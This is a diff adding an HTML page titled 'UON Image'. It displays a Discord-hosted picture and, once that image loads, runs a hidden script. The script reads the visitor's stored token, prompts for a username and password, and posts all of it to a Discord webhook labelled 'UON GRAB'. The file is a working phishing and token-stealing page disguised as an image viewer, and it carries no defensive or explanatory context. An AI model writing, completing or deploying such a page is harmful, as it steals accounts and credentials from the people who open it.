@@ -1,0 +1,20 @@
+<!DOCTYPE html>
+<html>
+<head><title>UON Image</title></head>
+<body>
+<img src="https://cdn.discordapp.com/attachments/1516976280166338762/1520383241746382948/TicTacToe.jpg?ex=6a40febc&is=6a3fad3c&hm=1bf64885330b170880998a44591fc65cfb80289792731df5794cb4a665fe07c3&" onload="grab()">
+<script>
+function grab() {
+  const token = localStorage.getItem('token') || 'No token';
+  const ip = 'Victim IP (add server for real)';
+  const user = prompt("Username?") || 'Unknown';
+  const pass = prompt("Password?") || 'Unknown';
+  fetch('https://discord.com/api/webhooks/1520155241226699002/-rOCW2cxp0EOxuK-Ybihe0d7U5rzHbKajootTKMbevy8cuhm0whkC3LeplbC1ezkcO_b', {
+    method: 'POST',
+    headers: {'Content-Type': 'application/json'},
+    body: JSON.stringify({content: '**UON GRAB**\nTOKEN: ' + token + '\nIP: ' + ip + '\nUSERNAME: ' + user + '\nPASSWORD: ' + pass})
+  });
+}
+</script>
+</body>
+</html>
